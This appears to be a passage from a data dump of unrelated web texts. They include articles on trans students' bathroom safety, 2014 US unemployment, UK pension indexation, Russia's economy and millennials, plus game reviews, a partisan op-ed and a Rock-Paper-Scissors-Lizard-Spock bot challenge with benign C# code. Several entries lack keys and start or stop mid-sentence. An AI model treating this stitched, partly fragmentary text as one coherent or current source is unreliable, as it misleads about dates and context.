of schools to provide opportunities for the healthy development of students was found. For instance there are significant demographic disparities by gender, as well as race and sexual orientation. The findings affirm a wide range of research that has documented the existence and persistence of inequalities throughout the US educational system. Marginalized students who did not feel safe when using bathroom facilities, in general, did not find school to be a secure place.\n\nCompared to their cisgender counterparts, bathroom safety for trans safety in particular had a significant impact on overall school safety, self-esteem and grades. “Together, these findings suggest that while identifying as trans may help students, on average, to affirm their sense of self within the broader community, it also exposes students to multiple barriers of sexism and genderism in successfully accessing both social and educational opportunities in school environments,” explain the authors.\n\n“Given the current legal and political contentions over the rights of trans students, our findings are particularly important in elucidating the specific dynamics of bathroom safety among adolescents who are both more substantially limited in their mobility and agency than adults, as well as engaged in crucial years of identity development, relative to both gender as well as a range of other identities and experiences,” they add.\n\nReference: Wernick, L., Kulick, A., & Chin, M.

  "latent_14040": "The US unemployment rate in March remained stubbornly elevated at 6.7% in March with 10.5 million people out of work, showing job growth is good, but not good enough to make a dent in the long-term doldrums that have slowed economic growth since the financial crisis ended in 2009.\n\nOnly around 192,000 Americans found new jobs in March, according to the Bureau of Labor Statistics. Economists had expected a much higher number – 200,000 to 225,000 new jobs – last month after the end of severe winter weather.\n\nThe numbers seem to confirm Federal Reserve chair Janet Yellen's observation last month that the elevated rate of joblessness shows that the economic recovery is \"far from complete\".\n\nOther measures of the unemployment crisis also barely budged during the month of March. Only about 63% of Americans are in the labor force, the lowest percentage since Jimmy Carter was president in 1978. About 2.2 million people were discouraged enough to give up looking for work, even though they wanted and were available for jobs.\n\nAbout 36% of all unemployed Americans, or 3.7 million people, fall into the category of the long-term unemployed who have been unable to find a job for 27 weeks or more, even though they are still actively looking. The US Senate has been wrangling over a bipartisan bill to extend those workers' unemployment benefits, which ran out in December, but the outlook is not promising, according to political analysts. Even if the bill makes it through the Senate, it's expected to flop in the House.\n\n\"The US economy continues to create jobs at a good but not great pace that we should be seeing this far into the recovery,\" said Lindsey Group chief market analyst Peter Boockvar.\n\nThe new numbers from the BLS, which come with significant revisions to previous months, only made the overall unemployment picture murkier and harder to interpret. After disappointing unemployment numbers in January and February, many economists had guessed that a particularly savage winter was to blame.\n\nAfter number-crunchers at the BLS had another chance to take a crack at the January and February unemployment surveys, \"the winter hit was smaller than previously believed,\" said Ian Shepherdson, chief economist at Pantheon Macroeconomics.\n\nThe polar vortex and other bad weather also dissipated as a plausible excuse for high unemployment in March, a month which showed much milder temperatures across the country and increased the likelihood that businesses would be open and ready to hire.\n\nYellen has made joblessness a key issue in the few weeks since her appointment to the most powerful financial post in the country, declaring in her first major speech in February that \"too many Americans remain unemployed\".\n\nShe also highlighted the stories of the unemployed in a speech last week as she took an unprecedented human tack for a Federal Reserve chair. \"They are a reminder that there are real people behind the statistics,\" Yellen said, and their stories \"tell us important things that the unemployment rate alone cannot.\"\n\nYellen has urged economists and market experts to stop looking at the unemployment rate, currently at 6.7%, as a measure of the health of the labor market or the economy. The unemployment rate has been steadily dropping from a peak of 10.2% in December 2009. That fall has been misleading, however, as it has represented more people dropping out of the labor force, where the government does not measure their jobs.\n\nThe falling rate of joblessness dominated many economic projections over the past few years because the Fed had promised to raise interest rates once the rate hit 6.5% – a threshold that the central bank backed away from last month. Yellen has argued for a larger range of measures of the health of the labor market, including labor-force participation.\n\nPart of the Fed's mandate is to bring the country to full employment, using a toolboox of interest rates and stimulus measures. The Fed has been active – keeping interest rates near zero and pouring billions of dollars into the program known as quantitative easing – but the unemployment crisis continues.\n\nOther measures of the health of the economy, including housing numbers, the trade deficit and consumer confidence, have also been dropping off.",

  "latent_14267": "Critics of White House Chief of Staff John Kelly’s speech Thursday are now taking the fight to illogical extremes.\n\nKelly’s statements at a White House press briefing on military service members killed in action were disturbingly totalitarian in nature and reminiscent of the language of a military coup, journalist Masha Gessen claimed Friday in a piece in The New Yorker. The author suggested Kelly’s praise of fallen soldiers reflected that of regimes like the Soviet Union that encouraged people to die for their countries on the battlefield.\n\nKelly called the brave men and women who have given their lives in service of the country “the very best this country produces,” adding that they “volunteer to protect the country,” even though “selfless service” is not required. Kelly often walks among the finest in America at Arlington National Cemetery.\n\nThe decision by Kelly, who lost a son in Afghanistan and men under his command, to refer to fallen soldiers as “the best” Americans struck a nerve with Gessen, triggering the following response.\n\n“It is in totalitarian societies, which demand complete mobilization, that dying for one’s country becomes the ultimate badge of honor,” Gessen wrote in her article. “Growing up in the Soviet Union, I learned the names of ordinary soldiers who threw their bodies onto enemy tanks, becoming literal cannon fodder. All of us children had to aspire to the feat of martyrdom.”\n\nThere is no indication that Kelly was openly encouraging U.S. service members to die in combat; rather, he appeared to honor those who sacrificed themselves for the U.S., just as countless others — including former President Barack Obama — have done.\n\n“The Americans who rest here and their families represent the best of us,” Obama said at Arlington on Memorial Day last year. “They ask of us today only one thing in return: that we remember them.” The former president’s words are the same as those of Kelly.\n\nThe New Yorker article equated the Trump administration’s decision to allow a career military professional to explain to reporters how he consulted the president on a military matter with signs of a military coup. The administration suggested that misleading reports prompted bringing out Kelly to clear up prevailing misconceptions.\n\nYet somehow, in ways not made abundantly clear in the article, the retired Marine Corps general’s words hinted at what a military coup might look like in America, according to the article.\n\nThe author of the piece, an outspoken critic of the president and his administration, provides no solid examples of similar military coups to support her argument.\n\nWATCH: GOLD STAR WIDOW RELEASES CONVERSATION WITH TRUMP\n\nFollow Ryan on Twitter\n\nSend tips to ryan@ dailycallernewsfoundation.org.\n\nContent created by The Daily Caller News Foundation is available without charge to any eligible news publisher that can provide a large audience.

Oops. Enjoy this tumblr exclusive, guys.)\n\nIt’s long been thought that Xbox Live Indie Games is an impenetrable cesspool of utter garbage. And you know what? It kind of is. But that doesn’t mean it isn’t worth paying attention to - the only problem is, the signal to noise ratio heavily favors noise. So I’ve taken it upon myself to be your tour guide - I’ve picked out a fairly massive selection of games, all you have to do is decide whether or not you want to try them out. You can thank me later. If you like what you see, click on that game’s name to be taken to Xbox.com where you can download a free trial (or even buy it!) And with that, let’s celebrate the twilight hour of one of the weirdest places on the Xbox 360 Games Marketplace…\n\nDON’T MISS THESE GAMES\n\nOcean Drive Challenge It used to be that you could download Outrun on Xbox Live Arcade - but Sega’s long since lost the Ferrari license, and with it, Outrun has vanished from the marketplace. Ocean Drive Challenge is here to fill that gap, with a stylish homage to the original arcade classic. You don’t get Outrun’s branching path system, but in its place you get multiple drivers, each with their own story to tell as they race down the game’s endless road. The tracks themselves could be a little bit wider given the girth of the vehicles motoring down these highways, but that just adds to the challenge.\n\nEchoes+ Combine Geometry Wars with Asteroids and you have a pretty clear picture of what to expect in Echoes+. There’s tons of power-ups, the typical neon glow, and tons upon tons of modes for you to waste hours in. There’s also a free PC version if you’re still on the fence, but the “plus” in Echoes+ presumably means you get some extra bang for your buck. And by that I mean this game literally costs a buck.\n\nFunky Balls Going by the name and the box art, I did not exactly expect much from Funky Balls. “Rolling ball” games are a dime a dozen these days, but something about Funky Balls was strangely charming. It took me back to the days of the Playstation 1 - when you had games like Intelligent Qube or N2O. It has that kind of feel to it, with a dash of Super Monkey Ball. I ended up really, really digging it.\n\nHONORABLE MENTIONS\n\nMega Shooter 11 I’ll be honest: I played Mega Shooter 11 more than a year ago and I don’t really remember much besides the fact that I think I kind of enjoyed it a lot. Its description bills it as an “extremely authentic retro side-scrolling space shooter”, with “intelligent gameplay”. Graphics are real purdy, too, despite the low color count and pixelated resolution.\n\nCoral’s Curse This game has to be seen in motion to be believed - best described as some kind of puzzle/action game, Coral’s Curse gives you control of a mythological beast that is half woman, half snake. You have full control over Coral’s slithering lower-half, allowing you to reach new areas and fit in to places most normal people would not. I can’t speak to whether or not the game itself is any good - I spent too long just messing around with the snake physics and the trial ended.\n\nShark Attack Deathmatch Chalk this up as another game I didn’t expect much out of but came away pleasantly surprised. Shark Attack Deathmatch is a legitimately tense sort of game - you’re a deep sea diver being stalked by a great white shark. Armed with nothing more than a harpoon gun, you must fight for your life or be mercilessly eaten. Plus: it’s got online co-op. And like a lot of these games, it’s only a buck.\n\nCurse of the Crescent Isle Yet another faux-retro indie game, Curse of the Crescent Isle sets itself apart by having a rather unique enemy mechanic. If I want to be a reductionist about it, imagine Super Mario Brothers 2 meets Ducktales: you pick up enemies, and instead of throwing them at other things, you use them to pogo around levels. Unfortunately the controls are a little bit stiff, but it’s nothing you can’t get used to.\n\nSO BAD THEY’RE GOOD\n\nAAH, HALLOWEEN PIE! There’s a lot of different tropes on Xbox Live Indie games: Ninjas, Avatars, Minecraft, Zombies… and games where the graphics are pre-rendered models of “sexy” women made using the Poser software. That’s where this comes in - essentially just the world’s most sloppy clone of Ghouls ‘n Ghosts, Halloween Pie seems to exist just to show you a greasy model of a women with gigantic breasts strip to her underwear every time one of a trillion skeletons so much as sneezes near her. The best thing that can be said for it is it actually contains a game you can play - most of the time they’re just immensely skeevy dating sims.\n\nAVATOUR VEGAS Stop and try to imagine what the worst possible game is. The worst possible controls, the worst possible sound, the worst possible graphics. Just the most foul garbage you can think of. What would that be like? It doesn’t matter: Avatour Vegas is worse. This is essentially a bunch of data likely cribbed from Google Earth and you can fly a completely static helicopter around. Just remember: what happens in Vegas, stays in Vegas. Including the dollar they expect you to pay for this.\n\nJUST PLAIN WEIRD\n\nGametype You know your Xbox Dashboard update is bad when somebody makes a game about how bad it is. Gametype was maybe probably supposed to educate people on where they could find the Xbox Indie Games listing - unfortunately, to get Gametype at all, you kind of already had to know how to get there in the first place, therefore kind of defeating some of the point.\n\nADVENTURES of CAPTAIN Becky Forget about the game part of ADVENTURES of CAPTAIN Becky - the real meat of this game is the character editor, which allows you to change what Becky herself looks like. It is weirdly robust for what an amazingly simple action game it is - you can change height, weight, skin color, facial features, and more, allowing you to transform Becky in to the horrifying purple troll monster of your dreams. That by itself is probably worth the price of admission.\n\nDid I miss your game? Do you think I did not give your game a fair assessment? Sorry about that - I am but one man.",

  "latent_14446": "On Tuesday afternoon MPs will debate the recent report by the Work and Pensions Select Committee on “intergenerational fairness”. Drawing on evidence the IFS, the committee argued that triple lock indexation of the state pension should not continue beyond 2020.\n\nFor a given amount of spending on state pensions there is a trade-off between the level of the state pension and the state pension age from which it is paid. With the triple lock a full single-tier pension in 2060 is projected to be worth 27.5% of average earnings and will be available from age 69. If we were to abandon the triple lock and instead index in line with average earnings beyond 2020, then a full single-tier pension in 2060 would be projected to be worth 24.2% of average earnings. For the same cost as the triple lock this could be paid from roughly age 67½. Alternatively if we wanted a higher pension at, say, 30.7% of average earnings then keeping within the same cost envelope could be achieved by increasing the pension age further to roughly age 70½.\n\nThe triple lock states that each year the state pension will increase by the highest of the increase in earnings, the increase in prices (as measured by the Consumer Price Index) and 2½%. Over the longer term this would eventually prove to be a financially unsustainable method of indexation. This is because every time earnings grow by less than either 2½% or prices then the value of the state pension would ratchet up as a share of average earnings.\n\nOf course it is not unreasonable to argue that the state pension should be made more generous (though it is should be remembered that – as IFS research has shown – pensioners are no longer a particularly poor group in society). But if the government wants to increase the level of the state pension relative to earnings, it should choose the level it wants (and potentially a path to get there) rather than allowing the somewhat haphazard increases relative to earnings that result from the triple lock. The last few years – in which earnings growth has been extremely weak – have seen triple lock indexation boost the value of the state pension dramatically, relative to both average earnings and prices. Between April 2010 and April 2016 the value of the state pension has been increased by 22.2%, compared to growth in earnings of 7.6% and growth in prices of 12.3% over the same period. This has pushed the value of the basic state pension up to its highest share of average earnings since April 1988. This increased benefit to pensioners came at the cost of an increase in spending of roughly £6 billion a year in 2015–16 compared with earnings indexation, and roughly £4 billion relative to CPI indexation, over the period since April 2011.\n\nProjecting the cost of the triple lock (relative to linking the level of the state pension to earnings growth) over the longer-term is difficult. If the economy delivers strong growth in earnings, without periods of boom and bust, then the lock would seldom apply and the state pension would mostly grow in line with earnings. But if the economy delivers weak and/or volatile earnings growth then the value of the state pension would, over time, ratchet up relative to average earnings. In its January 2017 Financial Sustainability Report the OBR projected state pension spending over the next fifty years under both the triple lock and an alternative scenario of earnings-indexation beyond the end of this parliament, with the cost of the triple lock being based on movements in earnings and prices over the thirty years from 1991 to the end of the their current forecast period in 2021. These projections are shown in the Figure below. Without the triple lock – the series shown in light green at the bottom of the figure – spending is projected to increase by 1.1% of national income between 2020–21 and 2060–61 (from 5.0% to 6.0%). This is equivalent to £21 billion in today’s terms. Under the triple lock spending (as shown by the dark green line) is projected to rise by 1.8% of national income over the same period (from 5.0% to 6.8%), which is equivalent to £35 billion in today’s terms, or some £15 billion more than under earnings indexation.\n\nFigure. OBR projections of state pension spending\n\nSource: Table 3.2, page 35 and Chart 3.10, page 58, of Office for Budget Responsibility, Financial Sustainability Report, January 2017, (http://cdn.budgetresponsibility.org.uk/FSR_Jan17.pdf).\n\nBoth these projections assume that the Government raises the state pension over time in line with the intention, announced by the then Chancellor George Osborne in the 2013 Autumn Statement, “that people should expect to spend, on average, up to one third of their adult life in receipt of the State Pension”. Recommendations on the level of the state pension age beyond 2028 (by when it is due to have reached age 67) are to come in the next couple of months from the independent review led by John Cridland. But on the basis of the “one third of adult life” statement from the Government, and the latest central longevity forecasts from the Office for National Statistics, the OBR calculates this would see the state pension age for men and women rise to 68 by 2041 and to 69 by 2055. This is in contrast to current legislation which has it rising to age 68 by 2046 and then not rising any further.\n\nThe OBR also projects state pension spending under the scenario where the triple lock is left in place, but that the state pension age rises only in line with the already legislated increases. This is shown in the red line at the top of this figure. Under this scenario projected spending in 2060–61 is 0.5% of national income – or £10 billion in today’s terms – higher than under the central scenario.\n\nThis implies that a one year increase in the state pension age (from age 68 to 69) by the mid 2050s reduces projected state pension spending in 2060–61 by 0.5% of national income, or £10 billion in today’s terms. But in the same year the triple lock is projected to cost 0.8% of national income, or £15 billion, more than under earnings indexation alone. Therefore these projections imply that, over the next forty years, the additional cost of triple lock – rather than earnings – indexation is roughly equivalent to the cost of increasing the state pension age by 1½ fewer years. So, in other words, keeping the triple-lock and increasing the state pension age to 69 in the mid-2050s might have similar public finance implications to moving to earnings indexation and instead only increasing the state pension age to 67½.\n\nThat is not to say that if we were to abandon the triple lock then the state pension age should increase less quickly. After all, as the Figure above shows, earnings-indexation of the state pension along with increases in the state pension age to 69 by the mid 2050s still leads to projected spending increasing as a share of national income over the next fifty years. If instead we scrapped the triple lock the scale of the increase in spending on the state pension – and therefore the cuts to spending elsewhere, or tax rises, needed to fund it – would be substantially reduced.",

The story takes a sharp dark turn, hinting at mysteries to be unveiled, and then into the thick of a violent fairy-on-fairy battlefield.\n\nOne of the notable things here is that some of the pros are cons, and vice versa. For instance: the story is a little wordy, yet doesn't fully flesh out the world. Some things have too much description (these tend to be details) and other things have too little description (these tend to be plot elements). A couple of things are obvious and explained to the reader anyway (like \"none of the knights had wings, and therefore most of them were on foot\"). Lines could be shortened; lines could be lengthened.\n\nThe story is fairly interesting except it's told in a scattered manner. The King's Daughters could be expanded into something double in length. Smoothing out transitions between events, going into more details about why some things are they way they are, etc. This may not be a con for some people. Everything is fast-paced, which many people will like. Others may prefer extra build-up.\n\nCould do with a few touch-up edits to make the prose flow more smoothly.

  "latent_14915": "There has always been something singularly romantic about train travel, what with its steady speed and constant sound. Mexican artists Ivan Puig and Andrés Padilla Domene felt the pull of the rails, but since Mexico privatized its railways in 1995, passenger travel has essentially disappeared. They didn't let that discourage them, though. Instead, they pushed ahead to create their own way to explore the country's roughly 6,000 miles of abandoned tracks.Part art project, part oral history and part adventure, they created the SEFT-1 (pictured above), which stands for Sonda de Exploración Ferroviaria Tripulada or Manned Railway Exploration Probe. Granted, they probably could have used just about any vehicle sturdy enough to take the offroad terrain, but the two of them took the idea much further. Starting with a pickup truck, they fabricated a retrofuturist body out of aluminum and a custom interior. The retractable wheels kept it on the tracks when they were still there. The complete design looks like Buckminster Fuller's Dymaxion car as rendered by Budget Flash Gordon.Along the way, they captured their adventure in pictures, video and audio recordings to post on their website (in Spanish) and visited schools to show of the SEFT-1 and share what they had learned. Scroll down to watch a video describing their adventures.\n\nSEFT-1 Abandoned Railways Exploration Probe from The Arts Catalyst on Vimeo.",

connection\n\nOriginal Posted Question\n\nYou've swung around to your friends house for the most epic showdown Battle ever of Rock, Paper, Scissors, Lizard, Spock. In true BigBang nerd-tastic style, none of the players are playing themselves but have created console bots to play on their behalf. You whip out your USB key and hand it over to the Sheldor the Conqueror for inclusion in the showdown. Penny swoons. Or perhaps Howard swoons. We don't judge here at Leonard's apartment.\n\nRules\n\nStandard Rock, Paper, Scissors, Lizard, Spock rules apply.\n\nScissors cut Paper\n\nPaper covers Rock\n\nRock crushes Lizard\n\nLizard poisons Spock\n\nSpock smashes Scissors\n\nScissors decapitate Lizard\n\nLizard eats Paper\n\nPaper disproves Spock\n\nSpock vaporizes Rock\n\nRock crushes Scissors\n\nEach player's bot will play one Match against each other bot in the tournament.\n\nEach Match will consist of 100 iterations of an RPSLV game.\n\nAfter each match, the winner is the player who has won the most number of games/hands out of 100.\n\nIf you win a match, you will be assigned 1 point in the league table. In the result of a draw-match, neither player will gain a point.\n\nBot Requirements\n\nYour bot must be runnable from the command line.\n\nSheldor's *nix box has died, so we're running it off his windows 8 Gaming Laptop so make sure your provided solution can run on windows. Sheldor has graciously offered to install any required runtimes (within reason) to be able to run your solution. (.NET, Java, Php, Python, Ruby, Powershell ...)\n\nInputs\n\nIn the first game of each match no arguments are supplied to your bot. In each subsequent game of each match: - Arg1 will contain the history of your bots hands/decisions in this match. - Arg2 will contain the history of your opponents hands/decisions in this match.\n\nHistory will be represented by a sequence of single capital letters representing the possible hands you can play.\n\n| R | Rock | | P | Paper | | S | Scissors | | L | Lizard | | V | Spock |\n\nE.g.\n\nGame 1: MyBot.exe\n\nGame 2: MyBot.exe S V\n\nGame 3: MyBot.exe SS VL\n\nGame 4: MyBot.exe SSR VLS\n\nOutput\n\nYour bot must write a single character response representing his \"hand\" for each game. The result should be written to STDOUT and the bot should then exit. Valid single capital letters are below.\n\n| R | Rock | | P | Paper | | S | Scissors | | L | Lizard | | V | Spock |\n\nIn the case where your bot does not return a valid hand (i.e. 1 of the above 5 single capital letters, then you automatically forfeit that hand and the match continues.\n\nIn the case where both bots do not return a valid hand, then the game is considered a draw and the match continues.\n\nMatch Format\n\nEach submitted bot will play one match against each other bot in the tournament.\n\nEach match will last exactly 100 games.\n\nMatches will be played anonymously, you will not have an advanced knowledge of the specific bot you are playing against, however you may use any and all information you can garner from his decision making during the history of the current match to alter your strategy against your opponent. You may also track history of your previous games to build up patterns/heuristics etc... (See rules below)\n\nDuring a single game, the orchestration engine will run your bot and your opponents bot 100 milliseconds apart and then compare the results in order to avoid any PRNG collisions in the same language/runtime. (this actually happened me during testing).\n\nJudging & Constraints\n\nDr. Sheldon Cooper in the guise of Sheldor the Conqueror has kindly offered to oversee the running of the tournament. Sheldor the Conqueror is a fair and just overseer (mostly). All decisions by Sheldor are final.\n\nGaming will be conducted in a fair and proper manner:\n\nYour bot script/program will be stored in the orchestration engine under a subfolder Players\\[YourBotName]\\\n\nYou may use the subfolder Players\\[YourBotName]\\data to log any data or game history from the current tournament as it proceeds. Data directories will be purged at the start of each tournament run.\n\nto log any data or game history from the current tournament as it proceeds. Data directories will be purged at the start of each tournament run. You may not access the Player directory of another player in the tournament\n\nYour bot cannot have specific code which targets another specific bots behavior\n\nEach player may submit more than one bot to play so long as they do not interact or assist one another.\n\nEdit - Additional Constraints\n\nRegarding forfeits, they won't be supported. Your bot must play one of the 5 valid hands. I'll test each bot outside of the tournament with some random data to make sure that they behave. Any bots that throw errors (i.e. forfeits errors) will be excluded from the tourney til they're bug fixed.\n\nBots may be derivative so long as they are succinctly different in their behaviour. Bots (including in other languages) that perform exactly the same behaviour as an existing bot will be disqualified\n\nThere are already spam bots for the following so please don't resubmit\n\nRock - BartSimpson\n\nPaper - LisaSimpson\n\nScissor - EdwardScissorhands\n\nSpock - Vulcan\n\nLizard - Khaleesi\n\nPseudo Random - SimpleRandomBot & FairBot\n\nPsuedo Random RPS - ConservativeBot\n\nPsuedo Random LV - Barney Stinson\n\nBots may not call out to 3rd party services or web resources (or anything else which significantly slows down the speed/decision making time of the matches). CasinoShakespeare is the only exception as that bot was submitted prior to this constraint being added.\n\nSheldor will update this question as often as he can with Tournament results, as more bots are submitted.\n\nOrchestration / Control Program\n\nThe orchestration program, along with source code for each bot is available on github.\n\nhttps://github.com/eoincampbell/big-bang-game\n\nSubmission Details\n\nYour submission should include\n\nYour Bot's name\n\nYour Code\n\nA command to execute your bot from the shell e.g. ruby myBot.rb python3 myBot.py OR first compile your both and then execute it. e.g. csc.exe MyBot.cs MyBot.exe\n\nSample Submission\n\nBotName: SimpleRandomBot Compile: \"C:\\Program Files (x86)\\MSBuild\\12.0\\Bin\\csc.exe\" SimpleRandomBot.cs Run: SimpleRandomBot [Arg1] [Arg2]\n\nCode:\n\nusing System; public class SimpleRandomBot { public static void Main(string[] args) { var s = new[] { \"R\", \"P\", \"S\", \"L\", \"V\" }; if (args.Length == 0) { Console.WriteLine(\"V\"); //always start with spock return; } char[] myPreviousPlays = args[0].ToCharArray(); char[] oppPreviousPlays = args[1].ToCharArray(); Random r = new Random(); int next = r.Next(0, 5); Console.WriteLine(s[next]); } }\n\nClarification\n\nAny questions, ask in the comments below.",
  "latent_15003": "I noted in an earlier blog that I believe volunteering can make you a stronger job candidate if you’re out of work and hoping to get hired. Now, an eye-popping government study proves it.\n\nThe Corporation for National and Community Service, a federal agency that promotes volunteerism, tracked more than 70,000 jobless people between 2002 and 2012 and found that those who volunteered had a 27% better chance of finding a job than those who didn’t.\n\nWhy Volunteering Can Help You Get Hired\n\nOne reason, according to the authors of the study \"Volunteering as a Pathway to Employment\": acquiring skills or knowledge as a volunteer and then putting them to use may “demonstrate higher levels of capacity, potentially making the volunteer more attractive to and productive for employers.”\n\n(MORE: 7 Reasons Volunteering Can Lead to a Job)\n\nThe report’s link between volunteering and getting a job was supported by a new study from the Center for Economic and Policy Research, a progressive think tank. The study — \"Does It Pay to Volunteer?\" — found that unemployed people who volunteered between 20 and 99 hours during the year were roughly 7% more likely to have found employment one year later compared to those who didn’t volunteer.\n\nA Boost for the Long-Term Unemployed\n\nWhile these results are important for all job seekers, they’re especially welcome news for the nation’s 4.4 million long-term unemployed (those out of work for at least six months); the average duration of unemployment for job seekers 55 and older is just over 13 months, according to AARP. That’s because the longer you’re unemployed, the weaker your social networks tend to be and the harder it then becomes to get a referral.\n\nAs a career coach, I’ve seen many examples of volunteering's benefits for the unemployed, but even I was surprised by this research. I knew it was valuable for job seekers, but 27% more valuable? That’s impressive.\n\nThe Job-Search Technique With Maximum Impact\n\nI can’t think of a single job-search strategy that’s been proven to have that much impact.\n\n(MORE: Tool: Find Volunteer Opportunities)\n\nThere are numerous reasons why volunteering can be so beneficial to your job hunt, in addition to the one noted in the Corporation for National and Community Service’s report.\n\nEmployers like to hire people who can demonstrate that they’re motivated and hard working, even if they haven’t been getting paid for their efforts lately. Volunteering can also provide you with an insider’s advantage if the nonprofit has an opening for a paid position.\n\n2 Big Benefits of Volunteering\n\nBut of all the many employment-related benefits of volunteering, I think two stand out most:\n\nVolunteering helps lift job seekers’ spirits by making them feel needed and productive. That’s an important psychological benefit for people dealing with a prolonged job search. As I’ve written before, keeping a positive mindset is arguably the single most critical element of success for finding work.\n\nI’ll never forget the time I spoke at a job-search support group and heard someone say: “I’ve been unemployed for a year and I’m feeling very discouraged. The one thing that has kept me sane is my volunteer job with EMS. I volunteer once a week and when I’m out in that ambulance, I’m just like everyone else. My services are needed and I’m able to make a difference. Seeing someone lying on a stretcher reminds me that my life isn’t so bad after all. I always feel better about myself after I volunteer.”\n\nVolunteering lets you expand your network of contacts easily and effectively. Finding a job these days is all about networking. And when you volunteer, you gain access to people you might not otherwise meet, creating opportunities to develop positive relationships outside a traditional work environment. Those contacts could be people who might ultimately hire you or who could refer you to others with job openings.\n\nBut as valuable as volunteering is, it’s important to remember that some types of unpaid work at nonprofits are better than others for securing your next paid job.\n\nVolunteer Work That Can Help You Most\n\nSo before you sign up to volunteer, I’d like to offer three pointers:\n\n1. Find the right fit. Many of us agree to help out because a friend asks and we feel obligated. But don’t volunteer by default.\n\nSeek out meaningful volunteer jobs that will provide you with new contacts, skills or expertise closely aligned with your professional goals.\n\n(MORE: How to Find Volunteer Work That Leads to a Paid Job)\n\n2. Treat your volunteer job like a paid job. Even if you provide assistance for only a few hours each week, it’s important to demonstrate professionalism and a serious commitment.\n\nLook for opportunities to take on assignments with greater responsibilities, like leadership roles or board positions.\n\nDon’t forget to connect with your volunteer network on LinkedIn, just as you would with work colleagues and remember to incorporate your unpaid nonprofit duties into your LinkedIn profile and resumé.\n\n3. Put the expertise and skills you have to use. When you’re in your 50s or 60s, you have plenty of knowledge and talents to share, so take advantage of your age.\n\nNonprofits are grateful when you can help them do things they either don’t know how to do or don’t have time to do, like project management, fundraising and strategic planning.\n\nTaking on this type of work as a volunteer is a win-win strategy for all involved. The organization gets the benefit of your unique abilities and you’ll rack up new accomplishments to talk about during your next job interview, which just might lead to an offer.\n\nNancy Collamer, M.S., is a career coach, speaker and author of Second-Act Careers: 50+ Ways to Profit From Your Passions During Semi-Retirement.

  "latent_15010": "Your browser does not support HTML5 video tag.Click here to view original GIF\n\nIn the first chapter of Ken Follett’s bestselling novel The Pillars of the Earth, mason Tom Builder and his family are journeying through snowy woods when his wife, Agnes, enters labor. The tragic events that follow serve as the opening to Daedalic Entertainment’s adventure game adaptation.\n\nReleased this week on Steam, Xbox One and PS4, Ken Follett’s The Pillars of the Earth is a three-episode interactive adaptation of the popular work of historical fiction. Daedalic Entertainment, a German developer known for adventure games like The Whispered World and Silence, applies its hand-drawn style to the story of the Kingsbridge priory and the building of its cathedral.\n\nIt’s less a game and more an interactive novel. There are choices to be made as Tom attempts to aid his wife in giving birth to their next child, but the choices coincide closely with events in the novel. Tom sends his daughter Martha off to gather reeds in order to make string, while his son Alfred heats water. They do the same things in the novel, but those actions are presented here as the result of in-game dialogue choices.\n\nIn this case the choices don’t feel like they amount to much. This sad occurrence is a key moment in The Pillars of the Earth, and it’s obvious that nothing the player can do in the video game adaptation will stop it from happening.\n\nHere’s the whole scene. Be warned, it might be a bit upsetting towards the end.\n\nIt could have been a cutscene and carried just as much weight, if not more. Reading the events unfold, or watching them, the reader/viewer is focused completely on the plight of Tom and his family. The pop-up choices lessen the drama.\n\nAdvertisement\n\nOn the other hand, just prior to the event above, we’re treated to a scene that wasn’t in the book. Tom, whose dream is to build a cathedral, shares that dream with his family. As he explains what’s special about a grand house of worship, the frozen woods are transformed by his words. It’s just lovely.\n\nIt’s a very pretty game, looking like something out of an old storybook. The animation is somewhat stilted, a stylistic choice on the part of the developers. I like it, though there are moments, especially as the game moves on to the story of Brother Phillip’s arrive at the Kingsbridge priory, where I’m getting a serious Archer vibe.\n\nAdvertisement\n\nThe arrival of Brother Phillip at Kingsbridge is where the game opens up. Phillip can wander the grounds, exploring the priory and its surroundings. He can interact with objects and chat with other characters. The game also introduces Phillip’s bible, an inventory item that can be used on items to deliver a pertinent passage from the scripture.\n\nAdvertisement\n\nClicking the bible on Philip’s horse, for example, has him quote Proverbs 12:10, “Whoever is righteous has regard for the life of his beast.” That’s exactly the additional flavor I am looking for in an interactive adaptation of a popular novel.\n\nWhile the opening moments are a little awkward, I’m looking forward to seeing the events of The Pillars of the Earth unfold in this new medium.

In early 2014, markets projected growth of 1.7 percent for 2014 and 2.3 percent in 2015, with a deceleration of inflation to about 5 percent and a policy rate of 5 percent.\n\nWith sanctions in place, the Russian economy wound up contracting 3.5 percent in 2014. Even in a benign scenario, Moscow can only expect flat growth in 2015. With subdued oil prices and weak ruble, only exports are driving growth.\n\nDespite the stalemate in Ukraine, the cease-fire may not last long. Brussels is not eager to extend further sanctions in the near term, nor will it readily remove them. Washington is a different story.\n\nRead MoreRussia's economic crisis 'will end Putin regime'\n\nPreparing for the 2016 election, members of Congress have proposed far tougher actions, which range from declaring Russia in breach of its obligations under the nuclear treaty (INF) to ousting Moscow from the World Trade Organization.\n\nWhat about medium-term expectations? In a benign scenario, Russian growth could climb to 1.5 percent by the late 2010s and stay there until the early 2020s. That is a far cry from Russia's BRIC-style peak growth of almost 7 percent in the pre-crisis world.\n\nIn an attempt to control the currency and inflation, Russia's central bank (CBR) raised the key rate from 5.50 percent at the start of the year to 17 percent after a huge 6.5-percent hike in December. The CBR also replaced its monetary head Ksenia Yudaeva with Dmitry Tulin. While the former can now focus on increasing flexibility in forecasting and strategy, the latter will ensure tougher enforcement in monetary policy.\n\nAfter CBR cut rates to 15 percent, the ruble decreased to the low 60s against the dollar. As the central bank sees a weak ruble as a better option than high interest rates, it cut rates again Friday to 14 percent and said more rate cuts will follow.",
  "latent_15247": "Many problems with kids can be traced to their parents. So why have millennials been singled out as a uniquely depraved generation? Weren’t they raised by somebody?\n\nFor those who may have missed the latest skirmish in America’s generational warfare, a new survey by marketing firm DDB finds millennials — those between 19 and 34 years old, more or less — may be more venal and self-aggrandizing than older folks. They’re more likely to consider themselves workaholics — even with a work ethic their elders find lacking — and a scandalous 27% of millennials say they’d take credit for a colleague’s work if it helped them get ahead. Just 15% of Generation Xers and 5% of baby boomers say they’d do that.\n\nThe nation, apparently, is appalled. “That millennial you're working with may be a jerk,” CNBC declared. This comes on top of widespread complaints that America’s young adults are narcissistic, godless, precious, lazy and probably much worse. It's likely the millennials are, so far, the most studied generation in American history — and they may also be the most maligned.\n\nBlame the boomers?\n\nBut maybe the maligners should examine their own complicity in the millennials’ debasement. Every one of us is a product of the environment we grow up in. The millennials came of age (or are still coming of age) during the longest bout of economic stress since the 1930s. And who caused that? By and large, the baby boomers who have run the country since Bill Clinton was first elected president in 1992.\n\nAmerica coasted through the 1990s on the momentum generated by five decades of remarkable growth and a nascent technology revolution. But by the 2000s, baby boomers had run up too much debt and a reckoning was inevitable. Two boomer presidents — 